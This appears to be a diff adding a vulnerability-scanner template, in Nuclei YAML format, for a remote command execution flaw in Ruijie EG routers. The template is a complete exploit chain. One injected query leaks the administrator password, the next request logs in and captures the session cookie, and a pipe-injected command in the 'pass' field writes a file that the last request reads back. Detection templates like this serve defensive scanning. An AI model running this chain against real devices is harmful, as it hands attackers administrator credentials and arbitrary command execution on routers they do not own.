@@ -1,0 +1,80 @@
+id: ruijie-eg-branch-rce
+info:
+  name: Ruijie EG branch_passw.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Attackers can use sandbox commands to obtain administrator account passwords, log in to the system, execute commands, and control the entire device.
+  tags: command-execution
+  classification:
+    cvss-score: 9.8
+  reference:
+    - http://fofa.so
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        username=admin&password=admin?show+webmaster+user
+    extractors:
+      - type: regex
+        name: admin_password
+        part: body
+        group: 1
+        regex:
+          - 'admin (.*?)"'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+        Cookie: RUIJIEID
+
+        username=admin&password={{admin_password}}
+    extractors:
+      - type: kval
+        name: ruijie_cookie
+        kval:
+          - "Set-Cookie"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "RUIJIEID"
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /itbox_pi/branch_passw.php?a=set HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: {{ruijie_cookie}}
+
+        pass=|echo+'{{rand_base(8)}}'>{{rand_base(8)}}.txt
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /itbox_pi/{{rand_base(8)}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{rand_base(8)}}"
+    matchers-condition: and
